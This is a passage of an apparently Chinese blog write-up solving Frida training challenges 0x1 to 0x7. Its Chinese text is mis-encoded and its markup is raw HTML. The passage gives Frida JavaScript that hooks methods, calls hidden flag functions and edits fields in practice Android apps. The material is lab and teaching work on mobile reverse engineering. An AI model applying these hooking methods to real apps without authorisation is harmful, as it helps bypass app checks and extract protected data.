class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> a = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);<br>  a.<span class="hljs-property">check</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">a, b</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">check</span>(<span class="hljs-number">4</span>, <span class="hljs-number">12</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>check å‡½æ•°æ˜¯ä¸€ä¸ª void å‡½æ•°ï¼Œæ²¡æœ‰è¿”å›å€¼ï¼Œä¸èƒ½ç›´æ¥è·å–å…¶è¿”å›å€¼ï¼Œä½†ä»–å¼¹çª—çš„æ—¶å€™åˆå»è°ƒç”¨äº† <code>setText</code> æ–¹æ³•ï¼Œç›´æ¥ hook å…¶å‚æ•°æ‰“å°å‡º flag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">TextView</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;android.widget.TextView&quot;</span>);<br><br>    <span class="hljs-title class_">TextView</span>.<span class="hljs-property">setText</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.CharSequence&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">text</span>) &#123;<br>        <span class="hljs-keyword">var</span> content = text.<span class="hljs-title function_">toString</span>();<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] æ£€æµ‹åˆ° TextView.setText() è¢«è°ƒç”¨ï¼Œå†…å®¹æ˜¯: &quot;</span> + content);   <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setText</span>(text);<br>    &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><p>ä¸¤ä¸ªè„šæœ¬ç»“åˆæ¥ç”¨ï¼Œå°±å¯ä»¥è®©ä»–ç›´æ¥æ‰“å° flag åˆ°å‘½ä»¤è¡Œä¸­</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);<br> <br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-property">check</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">a, b</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] æ‹¦æˆªåˆ° check()ï¼ŒåŸå§‹å‚æ•°ä¸º: &quot;</span> + a + <span class="hljs-string">&quot;, &quot;</span> + b);<br>        <span class="hljs-keyword">var</span> result = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">check</span>(<span class="hljs-number">4</span>, <span class="hljs-number">12</span>); <br>    &#125;;<br><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">TextView</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;android.widget.TextView&quot;</span>);<br><br>    <span class="hljs-title class_">TextView</span>.<span class="hljs-property">setText</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.CharSequence&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">text</span>) &#123;<br>        <span class="hljs-keyword">var</span> content = text.<span class="hljs-title function_">toString</span>();<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] TextView æ˜¾ç¤ºçš„å†…å®¹æ˜¯: &quot;</span> + content);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setText</span>(text);<br>    &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">frida -U -f com.ad2001.frida0x1 -l .\frida.js<br></code></pre></td></tr></table></figure><p><img src="/img/SYXqbumv9oFVr2xFmnHcITpfnGb.png"></p><h1 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h1><p>è¿™å…³æ¯”è¾ƒç‰¹åˆ«è¯¥åº”ç”¨ç›®å‰å”¯ä¸€åœ¨åšçš„äº‹æƒ…å°±æ˜¯è®¾ç½® TextViewï¼Œå¹¶ä¸”å®šä¹‰ä¸€ä¸ª get_flag å‡½æ•°</p><p><img src="/img/D4SgbhpzeoQWIUxjRDCc0cHbnGg.png"></p><p>ä½†æ˜¯è¯¥å‡½æ•°æ²¡æœ‰ä¸€å¤„è°ƒç”¨</p><p><img src="/img/SeZMbLhsBomJ7axAG17clhbznqc.png"></p><p>æ‰€ä»¥éœ€è¦æˆ‘ä»¬å»ä¸»åŠ¨è°ƒç”¨è¯¥æ–¹æ³•æ‰èƒ½æ‰“å°å‡º flag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);<br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-title function_">get_flag</span>(<span class="hljs-number">4919</span>);<br>&#125;)<br></code></pre></td></tr></table></figure><p>ç”±äºæ²¡æœ‰ç›´æ¥è°ƒç”¨ï¼Œæ‰€ä»¥ç›´æ¥æ³¨å…¥ frida è„šæœ¬ä¸èƒ½ç›´æ¥è·å– flagï¼Œå¾—åœ¨ app ç¯å¢ƒä¸‹è¿è¡Œè„šæœ¬æ‰èƒ½è°ƒç”¨æˆåŠŸ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">frida -U -f com.<span class="hljs-property">ad2001</span>.<span class="hljs-property">frida0x2</span><br></code></pre></td></tr></table></figure><p><img src="/img/Ffolb9pEyoKgY3x8kGrchy1TnKh.png"></p><p>å‰è€…ä¸èƒ½ç›´æ¥ä½¿ç”¨è„šæœ¬æ³¨å…¥ï¼Œæ˜¯å› ä¸º frida è„šæœ¬æ—©äº Activity åˆ›å»ºå°±å·²ç»æ³¨å…¥äº†ï¼ŒTextView è¿˜æ²¡åˆå§‹åŒ–ï¼Œè°ƒç”¨ t1.setText() ä¼šå¤±è´¥ï¼Œæ— æ³•æ˜¾ç¤ºå†…å®¹ï¼Œæœ€å¥½çš„æ–¹æ³•å°±æ˜¯åœ¨è„šæœ¬ä¸­åŠ å…¥å»¶æ—¶ç­‰ Activity åˆå§‹åŒ–åå†æ³¨å…¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br><br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);<br>        <span class="hljs-title class_">MainActivity</span>.<span class="hljs-title function_">get_flag</span>(<span class="hljs-number">4919</span>);<br>    &#125;, <span class="hljs-number">2000</span>);<br><br>&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">frida -U -f com.<span class="hljs-property">ad2001</span>.<span class="hljs-property">frida0x2</span> -l .\<span class="hljs-number">0x2</span>.<span class="hljs-property">js</span><br></code></pre></td></tr></table></figure><p><img src="/img/FXuLbzqlCo2WgyxWzFccvX4Yn9g.png"></p><p>å¯ä»¥ç›´æ¥ hook TextView ç±»çš„ setText æ–¹æ³•ç›´æ¥å°† flag æ‰“å°åˆ°å‘½ä»¤è¡Œä¸­</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br><br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);<br>        <span class="hljs-title class_">MainActivity</span>.<span class="hljs-title function_">get_flag</span>(<span class="hljs-number">4919</span>);<br>    &#125;, <span class="hljs-number">2000</span>);<br><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">TextView</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;android.widget.TextView&quot;</span>)<br>    <span class="hljs-title class_">TextView</span>.<span class="hljs-property">setText</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.CharSequence&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">text</span>) &#123;<br>    <span class="hljs-keyword">var</span> content = text.<span class="hljs-title function_">toString</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] TextView æ˜¾ç¤ºçš„å†…å®¹æ˜¯: &quot;</span> + content);<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p><img src="/img/MCiibvYKEoZWxtxXu3KcfIlAnMu.png"></p><h1 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h1><p>åªæœ‰å½“ code çš„å€¼ä¸º 512 çš„æ—¶å€™æ‰èƒ½è¾“å‡º flag</p><p><img src="/img/UGsubWnD1oQ6LTxnzfrcQk6Fn2f.png"></p><p>ä½†æ˜¯ checker ç±»ä¸­çš„ increase æ–¹æ³•å¹¶æ²¡æœ‰è¢«è°ƒç”¨ï¼Œæ‰€ä»¥ code æ˜¯ä¸å¯èƒ½ä¸º 512 çš„</p><p><img src="/img/PMUabv9ybo5qRxxbbwrcusjFnZg.png"></p><p>ç›´æ¥å°† code çš„å€¼ä¿®æ”¹ä¸º 512</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br><br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> check = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x3.Checker&quot;</span>);<br>        check.<span class="hljs-property">code</span>.<span class="hljs-property">value</span> = <span class="hljs-number">512</span>;<br>    &#125;, <span class="hljs-number">2000</span>);<br><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">TextView</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;android.widget.TextView&quot;</span>);<br><br>    <span class="hljs-title class_">TextView</span>.<span class="hljs-property">setText</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.CharSequence&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">text</span>) &#123;<br>        <span class="hljs-keyword">var</span> content = text.<span class="hljs-title function_">toString</span>();<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] TextView æ˜¾ç¤ºçš„å†…å®¹æ˜¯: &quot;</span> + content);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setText</span>(text);<br>    &#125;;<br><br>&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">frida -U -f com.ad2001.frida0x3 -l .\<span class="hljs-number">0x3</span>.js<br></code></pre></td></tr></table></figure><p><img src="/img/VA7sb7ZA6o7wL9xksP8cVCywnuc.png"></p><h1 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h1><p>è¿™ä¸€å…³å°±åªæœ‰ä¸€ä¸ª textview äº†</p><p><img src="/img/MhRabQ1RcoHQ9OxJAhwck0H1nCd.png"></p><p>å¯ä»¥åœ¨ <code>res/layout/activity_main.xml</code> ä¸­æ‰¾åˆ°å…¶å®šä¹‰</p><p><img src="/img/EZaQbwN3loxDNHx2WNGcjnjxnHb.png"></p><p>è™½ç„¶ <code>MainActivity</code> ä¸­æ²¡æœ‰å†…å®¹ï¼Œä½†æ˜¯åœ¨æºç éƒ¨åˆ†å¯ä»¥çœ‹åˆ°è¿˜æœ‰ä¸€ä¸ª <code>Checkç±»</code></p><p><img src="/img/MeSvbxW9WoW9GLxNAmycpiGNnSb.png"></p><p>å…¶ä¸­æœ‰ä¸€ä¸ª <code>get_flag</code> æ–¹æ³•ï¼ŒåŒæ ·æ²¡æœ‰ä»»ä½•å¼•ç”¨ï¼Œæˆ‘ä»¬éœ€è¦ä¸»åŠ¨è°ƒç”¨æ¥è¾“å‡º flag</p><p><img src="/img/Mq6IbwvrLojLQyxIe1PcNr8cnOb.png"></p><p>æ³¨æ„ï¼Œè¿™é‡Œçš„ Check æ²¡æœ‰å®ä¾‹åŒ–ï¼Œfrida å®ä¾‹åŒ–ç±»çš„æ—¶å€™è¦<strong>ä½¿ç”¨ $new</strong>**ï¼Œ**<strong>åŒæ—¶ä¸éœ€è¦å£°æ˜ç±»çš„ç±»å‹ç»Ÿä¸€ç”¨ var å³å¯</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br><br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">Check</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x4.Check&quot;</span>);<br>        <span class="hljs-keyword">var</span> check = <span class="hljs-title class_">Check</span>.$new();<br>        <span class="hljs-keyword">var</span> flag = check.<span class="hljs-title function_">get_flag</span>(<span class="hljs-number">1337</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] è·å–åˆ°çš„ flag ä¸º: &quot;</span> + flag);<br>    &#125;, <span class="hljs-number">2000</span>);<br><br>&#125;)<br></code></pre></td></tr></table></figure><p><img src="/img/JyRkbVHz4ojQ6YxNmd4coOyEnWS.png"></p><h1 id="0x5"><a href="#0x5" class="headerlink" title="0x5"></a>0x5</h1><p>è¿™ä¸€å…³çš„ flag å‡½æ•°æ˜¯ç›´æ¥å®šä¹‰åœ¨ MainActivity ä¸­ï¼Œçœ‹ä¼¼æˆ‘ä»¬å¯ä»¥ç›´æ¥è°ƒç”¨ flag å‡½æ•°è®©ä»–è¾“å‡º flag ä½†æ˜¯ flag æ–¹æ³•å¹¶ä¸æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•å¹¶ä¸èƒ½ç›´æ¥é€šè¿‡ç±»åè°ƒç”¨ï¼Œéœ€è¦ä»å®ä¾‹åŒ–çš„å¯¹è±¡ä¸­è°ƒç”¨</p><p><img src="/img/DhgNbLHrOoXWcUxUmEVcu9oqn8e.png"></p><p>å¦‚æœç›´æ¥è°ƒç”¨å¿…ç„¶ä¼šæŠ¥é”™</p><p><img src="/img/VBC5bGooqo3agYxOgQ7cFCqanae.png"></p><p>æ—¢ç„¶ä¸èƒ½ç›´æ¥é€šè¿‡ç±»åè°ƒç”¨ï¼Œé‚£å°±å®ä¾‹åŒ–å¯¹è±¡è°ƒç”¨ï¼Œä½†æ˜¯å½“å‰ç±»æ˜¯ <code>MainActivity</code> ï¼Œå¦‚æœå»åˆ›å»ºä¸€ä¸ªæ–°çš„ <code>MainActivity</code> å¯¹è±¡ è¿™æ ·å°±ç­‰äºéä¸»çº¿ç¨‹ä¸­åˆ›å»ºäº† Android UI ç»„ä»¶æˆ– Handler ç›¸å…³çš„å¯¹è±¡ï¼Œè¿™æ˜¯ Android ä¸å…è®¸çš„</p><p><img src="/img/KYRBbu5p4otMLoxevdFcASEznZc.png"></p><p>æ‰€ä»¥æœ€å¥½çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨ <code>Java.choose</code> ä»å†…å­˜ç›´æ¥è°ƒç”¨ç°æœ‰çš„å®ä¾‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">performNow</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&#x27;com.ad2001.frida0x5.MainActivity&#x27;</span>, &#123;<br>      <span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">instance</span>) &#123;<br>        instance.<span class="hljs-title function_">flag</span>(<span class="hljs-number">1337</span>);<br>    &#125;,<br>    <span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>æ³¨æ„ hook TextView çš„æ—¶æœºéœ€è¦æ—©äº flag æ–¹æ³•è°ƒç”¨æ—¶é—´</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">TextView</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;android.widget.TextView&quot;</span>);<br>        <span class="hljs-title class_">TextView</span>.<span class="hljs-property">setText</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.CharSequence&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">text</span>) &#123;<br>            <span class="hljs-keyword">var</span> content = text.<span class="hljs-title function_">toString</span>();<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] TextView æ˜¾ç¤ºçš„å†…å®¹æ˜¯: &quot;</span> + content);<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setText</span>(text);<br>        &#125;;<br><br>        <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&#x27;com.ad2001.frida0x5.MainActivity&#x27;</span>, &#123;<br>            <span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">instance</span>) &#123;<br>                instance.<span class="hljs-title function_">flag</span>(<span class="hljs-number">1337</span>);<br>            &#125;,<br>            <span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>            &#125;<br>        &#125;);<br>    &#125;);<br>&#125;, <span class="hljs-number">2000</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/XaP7bHlMxoTr9ZxpZQ5cl5cFnAh.png"></p><h1 id="0x6"><a href="#0x6" class="headerlink" title="0x6"></a>0x6</h1><p>è¿™ä¸€å…³è·Ÿä¸Šä¸€å…³å·®ä¸å¤šï¼Œåªä¸è¿‡ get_flag æ–¹æ³•çš„å‚æ•°æ˜¯ä¸€ä¸ªå¯¹è±¡</p><p><img src="/img/NWvJbCR5uoBCnAxAKwschvK4nGc.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">TextView</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;android.widget.TextView&quot;</span>);<br>        <span class="hljs-title class_">TextView</span>.<span class="hljs-property">setText</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.CharSequence&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">text</span>) &#123;<br>            <span class="hljs-keyword">var</span> content = text.<span class="hljs-title function_">toString</span>();<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] TextView æ˜¾ç¤ºçš„å†…å®¹æ˜¯: &quot;</span> + content);<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setText</span>(text);<br>        &#125;;<br><br>        <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&#x27;com.ad2001.frida0x6.MainActivity&#x27;</span>, &#123;<br><br>            <span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">instance</span>) &#123;<br>              <span class="hljs-keyword">var</span> <span class="hljs-title class_">Checker</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x6.Checker&quot;</span>);<br>              <span class="hljs-keyword">var</span> checker  = <span class="hljs-title class_">Checker</span>.$new();<br>              checker.<span class="hljs-property">num1</span>.<span class="hljs-property">value</span> = <span class="hljs-number">1234</span>;<br>              checker.<span class="hljs-property">num2</span>.<span class="hljs-property">value</span> = <span class="hljs-number">4321</span>;<br>                instance.<span class="hljs-title function_">get_flag</span>(checker);<br>            &#125;,<br>            <span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>            &#125;<br>        &#125;);<br>    &#125;);<br>&#125;, <span class="hljs-number">2000</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/RXdhbk0NQohW0KxQR51cLL0Onmf.png"></p><h1 id="0x7"><a href="#0x7" class="headerlink" title="0x7"></a>0x7</h1><p>è¿™ä¸€å…³è·Ÿä¸Šå…³å·®ä¸å¤šï¼Œç”¨åŒæ ·çš„è„šæœ¬å°±èƒ½åš</p><p><img src="/img/JkfWbnXWboxJ22xo9CkcHFvQnPe.png"></p><p>ä½†æ˜¯æ³¨å…¥ä¼šæç¤ºé‡è½½æ–¹æ³•å‚æ•°ç±»å‹é”™è¯¯</p><p><img src="/img/LcEsbBGeZoq1dbxbq9NcKXZ3ntb.png"></p><p>å‘ç° Checker ç±»ä¸­æœ‰ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå¯¹è±¡åˆå§‹åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨è¯¥æ–¹æ³•ï¼Œæ‰€ä»¥ä¼šäº§ç”ŸæŠ¥é”™</p><p><img src="/img/PIitbsQSxojfwBxQFs6cvRJQnce.png"></p><p>å› æ­¤ä»…éœ€è¦åœ¨å®ä¾‹åŒ–å¯¹è±¡çš„æ—¶å€™ç»™æ„é€ å‡½æ•°èµ‹å€¼å³å¯</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">TextView</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;android.widget.TextView&quot;</span>);<br>        <span class="hljs-title class_">TextView</span>.<span class="hljs-property">setText</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.CharSequence&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">text</span>) &#123;<br>            <span class="hljs-keyword">var</span> content = text.<span class="hljs-title function_">toString</span>();<br>            <span class="hljs-variable language_">console</span>.<span 